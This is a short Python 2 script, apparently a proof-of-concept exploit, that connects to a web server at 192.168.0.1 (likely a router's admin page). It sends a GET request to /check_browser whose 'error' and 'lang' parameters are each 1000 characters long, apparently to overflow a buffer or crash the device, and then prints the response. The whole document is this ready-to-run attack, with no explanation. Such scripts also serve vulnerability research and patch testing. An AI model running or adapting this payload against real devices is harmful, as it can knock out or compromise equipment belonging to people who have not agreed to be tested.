#!/usr/bin/env python

from socket import *


host='192.168.0.1'
port=80


sock=socket(AF_INET,SOCK_STREAM)
sock.connect((host,port))
sock.settimeout(3)


v='1'*1000

s='GET /check_browser?error=%s&lang=%s HTTP/1.1\r\n' %(v, v)
s+='Host:192.168.0.1\r\n'
s+='User-Agent: Mozilla\r\n'
s+='Content-type: text/plain\r\n'
s+='\r\n'

sock.sendall(s)

data=''
while 1:
    s=''
    try:
        s=sock.recv(11111)
    except:
        s=''
    if len(s)<1:
        break
    data+=s

print data
